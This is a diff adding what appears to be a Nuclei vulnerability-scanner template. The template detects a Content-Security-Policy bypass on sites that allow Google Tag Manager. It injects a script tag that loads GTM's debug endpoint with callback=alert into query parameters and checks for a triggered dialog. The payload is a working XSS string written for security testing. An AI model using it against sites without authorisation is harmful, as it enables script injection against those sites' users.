@@ -1,0 +1,53 @@
+id: googletagmanager-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google Tag Manager
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,googletagmanager,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: googletagmanager_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "googletagmanager_csp_xss == true"
+# digest: 4a0a00473045022100aa4da341c7555baa1941ad03033781159001c65397027be7378c4b8b8491d51f022076d8b0add7bef9dddf71d3ad1f3d6828857edf3998f8bbf29d66fcf5c90e7e6f:922c64590222798bb761d5b6d8e72950
